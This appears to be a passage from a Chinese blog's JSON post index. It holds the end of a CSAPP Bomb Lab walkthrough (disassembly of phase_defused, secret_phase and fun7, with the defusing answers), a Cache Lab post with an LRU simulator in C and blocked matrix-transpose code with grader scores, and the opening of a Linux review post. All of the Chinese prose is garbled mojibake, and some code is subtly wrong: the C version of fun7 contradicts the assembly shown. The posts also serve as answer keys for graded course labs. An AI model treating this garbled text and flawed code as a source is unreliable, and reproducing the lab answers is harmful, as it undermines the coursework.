ã€‚ç„¶åæ˜¯å¤§å¾ªç¯å†…åµŒå°å¾ªç¯ï¼Œå¤§å¾ªç¯ä¸­éƒ¨åˆ†çš„ä½œç”¨æ˜¯ç¡®å®šæ¯ä¸ªæ•°å¿…é¡»&lt;=6ï¼›å°å¾ªç¯çš„ä½œç”¨æ˜¯ç¡®å®šç¬¬iä¸ªæ•°ä¸å’Œç¬¬i+1ç¬¬6ä¸ªæ•°ç›¸åŒï¼ˆä¹Ÿå°±æ˜¯è¾“å…¥çš„æ‰€æœ‰æ•°å­—ä¸èƒ½æœ‰ç›¸åŒçš„ï¼‰ã€‚ç„¶åï¼Œå†æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯ä»¤a[i]=7-a[i],i=1,2,3,4,5,6ï¼Œå°±æ˜¯å°†å­˜äºæ ˆä¸­çš„æ•°ï¼ˆä¹Ÿæ˜¯ä½ è¾“å…¥çš„æ•°ï¼‰è¿›è¡Œå¯¹7æ±‚è¡¥å¹¶ä¿å­˜å›åŸä½ç½®ã€‚æ¥ä¸‹æ¥åˆæ˜¯ä¸€ä¸ªå¤§å¾ªç¯å¥—ä¸€ä¸ªå°å¾ªç¯ï¼Œä¸»è¦ä½œç”¨æ˜¯è®¿é—®ä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨çš„é¦–åœ°å€ä¸º0x6032d0ï¼Œé’ˆå¯¹è¾“å…¥çš„ç¬¬iä¸ªæ•°ï¼ŒæŒ‰ç…§a[i]çš„å€¼è·å–é“¾è¡¨ç¬¬a[i]ä¸ªèŠ‚ç‚¹ï¼Œå¹¶æŠŠèŠ‚ç‚¹é¦–åœ°å€æ”¾å…¥%rsp+0x20+0x0åˆ°%rsp+0x20+0x28åˆšå¥½æ˜¯6ä¸ªèŠ‚ç‚¹ã€‚ç„¶ååˆæ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œä¸»è¦æ˜¯è¯´æ˜ %rsp+0x20+0x0 ~åˆ°%rsp+0x20+0x28å­˜å‚¨çš„é“¾è¡¨èŠ‚ç‚¹å€¼å¿…é¡»æ˜¯é€’å‡çš„ã€‚æ‰¾åˆ°äº†å„èŠ‚ç‚¹çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ’åºå¾—åˆ°èŠ‚ç‚¹æ ‡å·çš„æ’åºï¼ŒèŠ‚ç‚¹æ ‡å·çš„æ’åºæ°æ°æ˜¯è¾“å…¥6ä¸ªæ•°å­—å¯¹7æ±‚è¡¥çš„å€¼ï¼Œç„¶åå†å¯¹7æ±‚è¡¥å³å¯å¾—åˆ°ç»“æœ4 3 2 1 6 5ã€‚ 2.7 secret phaseæŸ¥çœ‹ phase_defused çš„ assembly code 12345678910111213141516171819202122232425262728293031323334353600000000004015c4 &lt;phase_defused&gt;: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt; 4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 &lt;puts@plt&gt; 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 &lt;secret_phase&gt; 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 &lt;phase_defused+0x90&gt; 40164f: e8 dc f4 ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq å¯ä»¥çŸ¥é“ï¼Œç¬¬å››å…³å’Œç¬¬äº”å…³å‰ä¸¤ä¸ªéƒ½æ˜¯è¾“å…¥æ•´å‹ï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°å¿…é¡»è¦åœ¨ç¬¬å››å…³ï¼ˆç¬¬äº”å…³ä¸å¿…è¦ï¼‰è¾“å…¥çš„ä¸¤ä¸ªæ•´å½¢åé¢è¾“å…¥â€DrEvilâ€æ‰èƒ½æˆåŠŸè§¦å‘ã€‚åœ¨gdbä¸­æµ‹è¯•ï¼Œå‘ç° 0x402622:â€DrEvilâ€ ã€‚ 12345678910111213141516171819202122230000000000401242 &lt;secret_phase&gt;: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e &lt;read_line&gt; 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 &lt;strtol@plt&gt; 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c &lt;secret_phase+0x2a&gt; 401267: e8 ce 01 00 00 callq 40143a &lt;explode_bomb&gt; 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 &lt;fun7&gt; 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 &lt;secret_phase+0x40&gt; 40127d: e8 b8 01 00 00 callq 40143a &lt;explode_bomb&gt; 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 &lt;puts@plt&gt; 40128c: e8 33 03 00 00 callq 4015c4 &lt;phase_defused&gt; 401291: 5b pop %rbx 401292: c3 retq æŸ¥çœ‹ func7 çš„ assembly code 1234567891011121314151617181920210000000000401204 &lt;fun7&gt;: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 &lt;fun7+0x34&gt; 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 &lt;fun7+0x1c&gt; 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 &lt;fun7&gt; 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d &lt;fun7+0x39&gt; 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d &lt;fun7+0x39&gt; 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 &lt;fun7&gt; 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d &lt;fun7+0x39&gt; 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq å¯ä»¥æ¨æ–­å‡º func7 çš„ c ä»£ç æ˜¯ 123456int func7(int *p, int n){ if (!p) return 0; if (*p &lt; n) return 2 * func7(*(p+8), n) + 1; else if (*p == n) return 0; else return 2*fun7(*(p+4), n);} æ ¹æ®secret_phaseçš„è¿”å›å€¼ä¸º0å¾—åˆ°è¾“å…¥çš„å€¼ä¸æŒ‡é’ˆæŒ‡å‘çš„å€¼ç›¸ç­‰ï¼Œå³0x24ï¼Œå¯¹åº”çš„åè¿›åˆ¶ä¸º36","link":"/2022/02/02/%5Bcsapp%5D%20Lab2%20Bomb%20Lab/"},{"title":"[csapp] Lab4 Cache Lab","text":"Lab4 Cache Lab1. Writing a cache simulatorè¿™ä¸ª simulator éå¸¸çš„ç®€å•ï¼Œå®Œå…¨æ¨¡æ‹Ÿ LRU ç®—æ³•å°±è¡Œäº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216/* @author: chenghua.Wang * @time: 2022/02/17 * @breif: A LRU(least recently used) cache simulator. * A file of CSAPP cache lab. Puzzle A. * @note: compiled on ubuntu20.04 x86-64. gcc 9.3.0. */#include &quot;cachelab.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;getopt.h&gt;#include &lt;limits.h&gt;#include &lt;inttypes.h&gt;#define True 1#define Fasle 0#define _string_buf_ 1024typedef int32_t bool;// data structtypedef struct{ bool h, v; int32_t s, E, b; char t[_string_buf_];}_argument_unit_;typedef struct{ int64_t hit_cnt, miss_cnt, eviction_cnt;}_cnt_unit_;typedef struct{ int32_t valid; // bits int32_t tag; int32_t stamp; // used to count Least recently block.}_cache_line_;typedef struct{ _cache_line_ *cache_lines;}_cache_set_, *_cache_set_p_;// global data init._argument_unit_ arg_unit;_cnt_unit_ cnt_unit;// argument process function set.void help_arg();bool check_arg();// cache update and init function set._cache_set_p_ init_cache();void cache_update(uint32_t address, _cache_set_p_ cache_sets);void cache_update_stamp(_cache_set_p_ cache_sets);void simulate_cache();int main(int argc, char *argv[]){ arg_unit.h = arg_unit.v = Fasle; arg_unit.b = arg_unit.E = arg_unit.s = 0; cnt_unit.eviction_cnt = cnt_unit.hit_cnt = cnt_unit.miss_cnt = 0; int32_t opt; while(-1 != (opt = (getopt(argc, argv, &quot;hvs:E:b:t:&quot;)))){ switch (opt) { case 'h': help_arg(); arg_unit.h = True; break; case 'v': arg_unit.v = True; help_arg(); break; case 's': arg_unit.s = atoi(optarg); break; case 'E': arg_unit.E = atoi(optarg); break; case 'b': arg_unit.b = atoi(optarg); break; case 't': strcpy(arg_unit.t, optarg); break; default: help_arg(); break; } } check_arg(); simulate_cache(); printSummary(cnt_unit.hit_cnt, cnt_unit.miss_cnt, cnt_unit.eviction_cnt); return 0;}// argument process function set.void help_arg(){ printf(&quot;Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\\n&quot;); printf(&quot;-h: Optional help flag that prints usage info\\n&quot;); printf(&quot;-v: Optional verbose flag that displays trace info\\n&quot;); printf(&quot;-s &lt;s&gt;: Number of set index bits\\n&quot;); printf(&quot;-E &lt;E&gt;: Associativity (number of lines per set)\\n&quot;); printf(&quot;-b &lt;b&gt;: Number of block bits\\n&quot;); printf(&quot;-t &lt;tracefile&gt;: Name of the valgrind trace to replay\\n&quot;); return;}bool check_arg(){ if(arg_unit.s&lt;=0 || arg_unit.E&lt;=0 || arg_unit.b&lt;=0 || arg_unit.t==NULL) return Fasle; else return True;}// cache update and init function set._cache_set_p_ init_cache(){ /* get memory for sets and cache_line * s is Number of set index bits. so S = 2^s is the number of sets. * E is Associativity (number of lines per set) * b is Number of block bits */ int32_t tmp_S = 1 &lt;&lt; arg_unit.s; _cache_set_p_ _ret_cache_sets = (_cache_set_p_)malloc(sizeof(_cache_set_) * tmp_S); for (int32_t i = 0; i &lt; tmp_S; ++i){ _ret_cache_sets[i].cache_lines = (_cache_line_ *)malloc(sizeof(_cache_line_) * arg_unit.E); for (int32_t j = 0; j &lt; arg_unit.E; ++j){ _ret_cache_sets[i].cache_lines[j].valid = 0; _ret_cache_sets[i].cache_lines[j].tag = -1; _ret_cache_sets[i].cache_lines[j].stamp = -1; } } return _ret_cache_sets;}void cache_update(uint32_t address, _cache_set_p_ cache_sets){ // update cache, use address. // b is the Number of block bits int32_t set_index_address = (address &gt;&gt; arg_unit.b) &amp; ((-1U) &gt;&gt; (64 - arg_unit.s)); int32_t tag_address = address &gt;&gt; (arg_unit.b + arg_unit.s); // hit. for (int32_t i = 0; i &lt; arg_unit.E; ++i){ if (cache_sets[set_index_address].cache_lines[i].tag == tag_address){ cache_sets[set_index_address].cache_lines[i].stamp = 0; cnt_unit.hit_cnt ++; return; } } // miss but have blank line. for (int32_t i = 0; i &lt; arg_unit.E; ++i){ if (cache_sets[set_index_address].cache_lines[i].valid == 0){ cache_sets[set_index_address].cache_lines[i].valid = 1; cache_sets[set_index_address].cache_lines[i].tag = tag_address; cache_sets[set_index_address].cache_lines[i].stamp = 0; cnt_unit.miss_cnt ++; return; } } // miss and need to be replaced. cnt_unit.miss_cnt ++; cnt_unit.eviction_cnt ++; int32_t max_stamp = INT_MIN; int32_t max_stamp_idx = -1; for (int32_t i = 0; i &lt; arg_unit.E; ++i){ if (cache_sets[set_index_address].cache_lines[i].stamp &gt; max_stamp){ max_stamp = cache_sets[set_index_address].cache_lines[i].stamp; max_stamp_idx = i; } } cache_sets[set_index_address].cache_lines[max_stamp_idx].tag = tag_address; cache_sets[set_index_address].cache_lines[max_stamp_idx].stamp = 0; return;}void cache_update_stamp(_cache_set_p_ cache_sets){ int32_t tmp_S = 1 &lt;&lt; arg_unit.s; for (int32_t i = 0; i &lt; tmp_S; ++i){ for (int32_t j = 0; j &lt; arg_unit.E; ++j){ cache_sets[i].cache_lines[j].stamp ++; } } return;}void simulate_cache(){ /* Start simulate. * Read data from file(t). * The format in file is &lt;op + address + size&gt; * &quot;I 0400d7d4,8&quot; * &quot; M 0421c7f0,4&quot; * &quot; L 04f6b868,8&quot; * &quot; S 7ff0005c8,8&quot; * ignore I instruction. */ int32_t tmp_S = 1 &lt;&lt; arg_unit.s; FILE* fp = fopen(arg_unit.t, &quot;r&quot;); if(fp == NULL){ printf(&quot;open error&quot;); exit(-1); } _cache_set_p_ cache_sets = init_cache(); char op; uint32_t address; int32_t size; while(fscanf(fp, &quot; %c %xu,%d\\n&quot;, &amp;op, &amp;address, &amp;size) &gt; 0){ switch (op){ case 'L': cache_update(address, cache_sets); break; case 'M': cache_update(address, cache_sets); case 'S': cache_update(address, cache_sets); break; } cache_update_stamp(cache_sets); } fclose(fp); for (int32_t i = 0; i &lt; tmp_S; ++i){ free(cache_sets[i].cache_lines); } free(cache_sets);} 2 Optimizing matrix transposeé¦–å…ˆæµ‹è¯•çš„å‰ææ˜¯ cache 32-setï¼Œeach set has only one cache lineï¼Œand each cache line has 32 bytes. æœ€å¤šä½¿ç”¨ 12 ä¸ªå˜é‡ 2.1 32 x 32å…ˆä½¿ç”¨æœ€åŸå§‹çš„æ–¹æ³•ï¼š 123456789if (M == 32){ int tmp; for (int i = 0; i &lt; N; i++) { for (int j = 0; j &lt; M; j++) { tmp = A[i][j]; B[j][i] = tmp; } }} æ˜¾ç„¶ï¼Œè¿™æ ·å¾—åˆ°çš„ç»“æœæ˜¯ç³Ÿç³•çš„ã€‚ 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:870, misses:1183, evictions:1151Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151Summary for official submission (func 0): correctness=1 misses=1183TEST_TRANS_RESULTS=1:1183 å¯ä»¥çœ‹åˆ° miss æ•°è¾¾åˆ°äº†æƒŠäººçš„ 1183 ä¸ªã€‚ 8x8 çš„åˆ†å— å¯¹äº 32 x 32 çš„çŸ©é˜µéå¸¸å®¹æ˜“æƒ³åˆ°å¯ä»¥ä½¿ç”¨ 8 x 8 çš„åˆ†å—ã€‚å› ä¸º cache line ä¸€è¡Œèƒ½å¤Ÿå­˜å‚¨çš„ä¸€å…±å°±æ˜¯ 8 Byteï¼Œåœ¨ 32 x 32 çš„çŸ©é˜µä¸­ï¼Œä¸€è¡Œæœ‰ 32 ä¸ª intï¼Œ ä¸€å…±å°±æ˜¯éœ€è¦ 4 ä¸ª cache line å¯ä»¥ï¼Œé‚£ä¹ˆæ‰€æœ‰ cache å¯ä»¥è£…ä¸‹çŸ©é˜µçš„ 8 è¡Œã€‚æ‰€ä»¥è¿™é‡Œä½¿ç”¨ 8 x 8 åˆ†å—ã€‚ 1234567if (M == 32){ for (int i = 0; i &lt; N; i += 8) for (int j = 0; j &lt; M; j += 8) for (int m = i; m &lt; i + 8; ++m) for (int n = j; n &lt; j + 8; ++n) B[n][m] = A[m][n];} è¿™æ · 8 x 8 çš„ä¸€ç»„ï¼Œå°±å¯ä»¥è®© cache è¢«å……åˆ†çš„åˆ©ç”¨èµ·æ¥ã€‚ å®éªŒç»“æœï¼š 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:1710, misses:343, evictions:311Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151Summary for official submission (func 0): correctness=1 misses=343TEST_TRANS_RESULTS=1:343 8 x 8 åˆ†å—æœ€ä¼˜æ€§èƒ½æ¢è®¨ ä¸ºäº†æ¢è®¨æœ€ä¼˜æ€§èƒ½ï¼Œæˆ‘å†ç†ä¸€é cache çš„è¿è¡Œè¿‡ç¨‹ã€‚åœ¨ Aï¼ŒBä¸¤ä¸ªçŸ©é˜µä¸­ï¼Œcache set æ˜¯è¿™æ ·è¢«åˆ†é…çš„ã€‚ $$\\begin{array}{l}0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0 \\newline4&amp;4&amp;4&amp;4&amp;4&amp;4&amp;4&amp;4 \\newline8&amp;8&amp;8&amp;8&amp;8&amp;8&amp;8&amp;8\\newline12&amp;12&amp;12&amp;12&amp;12&amp;12&amp;12&amp;12\\newline16&amp;16&amp;16&amp;16&amp;16&amp;16&amp;16&amp;16\\newline20&amp;20&amp;20&amp;20&amp;20&amp;20&amp;20&amp;20\\newline24&amp;24&amp;24&amp;24&amp;24&amp;24&amp;24&amp;24\\newline28&amp;28&amp;28&amp;28&amp;28&amp;28&amp;28&amp;28\\newline\\end{array}$$ è¿™ä¸ª 8x8 çš„çŸ©é˜µè¡¨ç¤ºçš„å°±æ˜¯ ç¬¬ä¸€ä¸ªåˆ†å—çŸ©é˜µçš„ set çš„ä½ç½®ã€‚æˆ‘ä»¬ä»¥è¿™ä¸ªå°çš„çŸ©é˜µä¸ºä¾‹ï¼Œè§£é‡ŠåŸå§‹æ–¹æ³•å’Œä¸Šæ–‡ä¸­çš„ 8x8 æ–¹æ³•ä¸ºä»€ä¹ˆæœ‰å¤§é‡çš„ cache missã€‚ å½“æˆ‘ä»¬ä½¿ç”¨åŸå§‹æ–¹æ³•çš„æ—¶å€™ï¼Œæˆ‘ä»¬é¦–å…ˆè®¿é—®çš„æ˜¯A[0][0]ï¼Œè¿™ä¼šé€ æˆä¸€æ¬¡ cold missï¼Œç„¶åå†™å…¥ B[0][0]ï¼Œ åˆä¼šé€ æˆä¸€æ¬¡ conflict missï¼Œæ¥ä¸‹æ¥è®¿é—®A[0][1]ï¼Œä¼šé€ æˆä¸€æ¬¡ conflict missï¼Œåœ¨å†™å…¥ B[1][0] ä¼šé€ æˆä¸€æ¬¡ cold missï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å¤§é‡çš„ miss è¢«ç”¨åœ¨ Aï¼ŒB çŸ©é˜µçš„è½¬æ¢çš„è¿‡ç¨‹ä¸­äº†ã€‚ é‚£ä¹ˆå†çœ‹ 8x8 çš„çŸ©é˜µçš„æƒ…å†µã€‚8x8 çš„çŸ©é˜µå°±æ˜¯ä¸ºäº†é˜²æ­¢ Aï¼ŒBä¹‹é—´å¤§é‡çš„å†²çªã€‚å¯ä»¥å‘ç°åœ¨ 8x8 çš„çŸ©é˜µä¸­ï¼Œé™¤äº†å¯¹è§’çº¿ï¼Œå…¶ä»–Aï¼ŒBä¸­ç›¸å¯¹åº”çš„å…ƒç´ éƒ½æ˜¯åœ¨ä¸åŒçš„ set ä¸­çš„ã€‚è¿™æ ·å¯ä»¥å‡å°‘å¤§é‡çš„ conflict missã€‚æ¯ä¸ªå°å—ä¸­ï¼Œå…ˆæŒ‰ç…§è¡Œè¯»Aï¼Œå†æŒ‰ç…§åˆ—å†™Bï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œæ¯ä¸ªAçš„8x8 çš„å—ä¸­åªæœ‰ç¬¬ä¸€åˆ—ä¼šå‡ºç° cold missï¼Œæ¯ä¸ªBçš„ 8x8 çš„å—ä¸­åªæœ‰ç¬¬ä¸€åˆ—ä¼šå‡ºç° cold missï¼Œä½†æ˜¯ Bçš„å¯¹è§’çº¿ä¸Šä¼šå‡ºç° conflict missï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼°è®¡å‡ºæ€»çš„ miss æ•°é‡åº”è¯¥æ˜¯ åœ¨Aä¸­æœ‰ 16 x 8 = 128 missesï¼Œåœ¨Bä¸­æœ‰ 16 x 8 + 28(å¯¹è§’çº¿) = 156 missesï¼Œé‚£ä¹ˆå¦‚æœèƒ½å¤Ÿæ¶ˆé™¤å¯¹è§’çº¿ä¸Šçš„ conflict missï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ° æ€»è®¡ 256 æ¬¡ misses çš„æœ€ä¼˜æ€§èƒ½ã€‚ è€ƒè™‘åˆ°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ æœ€å¤š 12 ä¸ªé¢å¤–çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦å¤–çš„ 8 ä¸ªå‚æ•°æ¥é¿å…conflict é—®é¢˜ã€‚ 1234567891011121314151617181920212223if(M == 32){ int tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7, tmp8; for (int i = 0; i &lt; 32; i += 8) for(int j = 0; j &lt; 32; j += 8) for(int k = i; k &lt; (i + 8); ++k){ tmp1 = A[k][j]; tmp2 = A[k][j+1]; tmp3 = A[k][j+2]; tmp4 = A[k][j+3]; tmp5 = A[k][j+4]; tmp6 = A[k][j+5]; tmp7 = A[k][j+6]; tmp8 = A[k][j+7]; B[j][k] = tmp1; B[j+1][k] = tmp2; B[j+2][k] = tmp3; B[j+3][k] = tmp4; B[j+4][k] = tmp5; B[j+5][k] = tmp6; B[j+6][k] = tmp7; B[j+7][k] = tmp8; }} ç»“æœå¦‚ä¸‹ï¼š 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:1766, misses:287, evictions:255Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151Summary for official submission (func 0): correctness=1 misses=287TEST_TRANS_RESULTS=1:287 2.2 64 x 64å¯¹ 64 x 64 çš„çŸ©é˜µæ¥è¯´ï¼Œæ¯è¡Œæœ‰ 64 ä¸ª intï¼Œåˆ™ cache åªèƒ½å­˜çŸ©é˜µçš„ 4 è¡Œäº†ï¼Œæ‰€ä»¥ 8x8 çš„åˆ†å—è‚¯å®šæ˜¯æœ‰é—®é¢˜çš„ï¼Œå¦‚æœä½¿ç”¨ 8x8 çš„åˆ†å—ï¼Œä¸€å®šä¼šåœ¨å†™ B çš„æ—¶å€™é€ æˆå†²çªã€‚æˆ‘ä»¬å…ˆç”¨ 4x4 çš„çŸ©é˜µåˆ†å—è·‘ä¸€ä¸‹è¯•è¯•ã€‚ 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:6498, misses:1699, evictions:1667Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691Summary for official submission (func 0): correctness=1 misses=1699TEST_TRANS_RESULTS=1:1699 å®éªŒç»“æœå¹¶ä¸æ˜¯å¾ˆç†æƒ³ã€‚ ä¼˜åŒ– æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…ˆ 8 åˆ†å—ï¼Œå†ä½¿ç”¨ 4 åˆ†å—çš„æ–¹æ³•æ¥å®ç°ã€‚æˆ‘ä»¬ä»ç„¶ä» set å†²çªçš„è§’åº¦ä¸Šæ¥è€ƒè™‘ã€‚ 1234567891011121314151617181920212223242526if (M == 64) { int i, j, x, y; int x1, x2, x3, x4, x5, x6, x7, x8; for (i = 0; i &lt; N; i += 8) for (j = 0; j &lt; M; j += 8){ for (x = i; x &lt; i + 4; ++x){ x1 = A[x][j]; x2 = A[x][j+1]; x3 = A[x][j+2]; x4 = A[x][j+3]; x5 = A[x][j+4]; x6 = A[x][j+5]; x7 = A[x][j+6]; x8 = A[x][j+7]; B[j][x] = x1; B[j+1][x] = x2; B[j+2][x] = x3; B[j+3][x] = x4; B[j][x+4] = x5; B[j+1][x+4] = x6; B[j+2][x+4] = x7; B[j+3][x+4] = x8; } for (y = j; y &lt; j + 4; ++y){ x1 = A[i+4][y]; x2 = A[i+5][y]; x3 = A[i+6][y]; x4 = A[i+7][y]; x5 = B[y][i+4]; x6 = B[y][i+5]; x7 = B[y][i+6]; x8 = B[y][i+7]; B[y][i+4] = x1; B[y][i+5] = x2; B[y][i+6] = x3; B[y][i+7] = x4; B[y+4][i] = x5; B[y+4][i+1] = x6; B[y+4][i+2] = x7; B[y+4][i+3] = x8; } for (x = i + 4; x &lt; i + 8; ++x){ x1 = A[x][j+4]; x2 = A[x][j+5]; x3 = A[x][j+6]; x4 = A[x][j+7]; B[j+4][x] = x1; B[j+5][x] = x2; B[j+6][x] = x3; B[j+7][x] = x4; } } } æœ€ç»ˆç»“æœ 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:9066, misses:1179, evictions:1147Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691Summary for official submission (func 0): correctness=1 misses=1179TEST_TRANS_RESULTS=1:1179 2.3 61 x 67è€ƒè™‘å…¶ä»–çš„åˆ†å—å¤§å°ã€‚ æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯åš 8x8 çš„åˆ†å—ã€‚åˆ†å—çš„æ–¹å¼å’Œä¸Šæ–‡ä¸­çš„ä¸€æ ·ï¼Œä½†æ˜¯ä»»ç„¶å­˜åœ¨ Aï¼ŒBä¹‹é—´åå¤conflict miss çš„é—®é¢˜ã€‚ æœ€ç»ˆçš„ç»“æœå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526Part A: Testing cache simulatorRunning ./test-csim Your simulator Reference simulatorPoints (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27Part B: Testing transpose functionRunning ./test-trans -M 32 -N 32Running ./test-trans -M 64 -N 64Running ./test-trans -M 61 -N 67Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 8.0 8 287Trans perf 64x64 8.0 8 1179Trans perf 61x67 10.0 10 1905 Total points 53.0 53","link":"/2022/03/05/%5Bcsapp%5D%20Lab4%20Cache%20Lab/"},{"title":"Linuxå¤ä¹ ","text":"linuxæœŸæœ«å¤ä¹ æœ¬æ–‡ä¸­ä¸€äº›$aè¿™æ ·çš„shellå˜é‡å¼•ç”¨ä¼šè¢«mathjexç¿»è¯‘æˆå…¬å¼ï¼Œè¯·åˆ†è¾¨ã€‚ åŸºæœ¬çš„å‘½ä»¤ å¦‚ä½•å®‰è£…åº”ç”¨ç¨‹åºï¼Œå¿«æ·é”®ç­‰(vimï¼Œlinuxæœ¬èº«çš„å¿«æ·é”®) shellè„šæœ¬ ç¼–è¯‘(gccï¼Œmakefile) shellå‘½ä»¤çš„cè¯­è¨€å®ç° å¤šè¿›ç¨‹ä¸çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µä¸ç¼–ç¨‹ è¯¾ç¨‹å†…å®¹å›é¡¾ å„ç±»Linuxä¸‹çš„å‘½ä»¤ï¼› Shellè„šæœ¬ï¼› 